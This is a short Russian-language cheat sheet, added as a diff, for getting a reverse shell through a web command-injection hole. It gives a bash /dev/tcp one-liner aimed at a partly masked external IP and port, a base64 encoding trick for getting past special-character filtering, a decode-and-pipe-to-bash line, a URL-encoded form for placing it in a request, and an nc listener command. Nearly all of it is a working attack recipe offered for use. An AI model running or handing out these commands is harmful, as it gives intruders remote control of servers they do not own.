@@ -1,0 +1,20 @@
+# Reverse shell one-liner + трюк с base64 (шпаргалка)
+# ⚠ IP листенера замаскирован (195.58.x.x). Подставьте свой <LHOST>/<LPORT>.
+# ЗАЧЕМ: обойти фильтрацию спецсимволов в вебе, передав команду в base64,
+#        которую цель декодирует и исполняет через bash.
+
+# 1) Базовый reverse shell (bash):
+bash -i >& /dev/tcp/195.58.x.x/7475 0>&1
+
+# 2) Кодируем строку в base64 (IP замаскирован в примере):
+#    echo -n 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' | base64
+#    → YmFzaCAtaSA+JiAvZGV2L3RjcC88TEhPU1Q+LzxMUE9SVD4gMD4mMQ==
+
+# 3) Цель декодирует и исполняет:
+echo <BASE64> | base64 -d | bash
+
+# 4) URL-encoded вариант для вставки в запрос (пробелы/плюсы экранированы):
+#    echo+<BASE64_URLENC>+|+base64+-d|+bash
+
+# Слушатель на своей стороне:
+#    nc -lvnp <LPORT>
